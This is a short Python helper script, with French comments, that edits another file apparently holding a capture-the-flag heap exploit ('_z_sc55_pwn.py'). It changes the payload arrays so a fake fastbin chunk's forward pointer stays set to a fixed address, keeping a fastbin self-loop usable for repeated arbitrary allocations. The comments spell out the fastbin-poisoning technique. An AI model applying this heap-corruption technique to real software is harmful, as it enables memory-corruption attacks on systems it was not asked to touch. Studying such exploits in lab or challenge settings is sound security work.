p=r"./_z_55\_z_sc55_pwn.py"
s=open(p,encoding="utf-8").read()
# 1) les slots 2..5 sont en realite remis a 0 par le payload du 4e buy(0x58) de la stage 1b
s=s.replace("    # les 4 buy(0x58) de la stage 1b ont rempli les slots 2..5 (pointeurs tas reels)\n    creams[2] = creams[3] = creams[4] = creams[5] = 1\n","")
# 2) pay[0] = 0x602130 = fd du faux chunk -> le self-loop fastbin[4] doit rester arme
old="        pay = [0, 0, FAKE_FAST, 0, 0, 0, 0, 0, 0, 0, 0]"
new=("        # pay[0] s'ecrit en 0x602130 = fd du faux chunk : il DOIT valoir FAKE_FAST sinon\n"
     "        # fastbin[4] est desarme apres le reset et les resets suivants ne rendent plus 0x602130.\n"
     "        pay = [FAKE_FAST, 0, FAKE_FAST, 0, 0, 0, 0, 0, 0, 0, 0]")
assert old in s
s=s.replace(old,new)
old2="            pay = [0, 0, FAKE_FAST, heap + 0x130, 0x602050, 0x602080, 0, 0, 0, 0, 0]"
new2="            pay = [FAKE_FAST, 0, FAKE_FAST, heap + 0x130, 0x602050, 0x602080, 0, 0, 0, 0, 0]"
assert old2 in s
s=s.replace(old2,new2)
open(p,"w",encoding="utf-8").write(s)
print("patched")
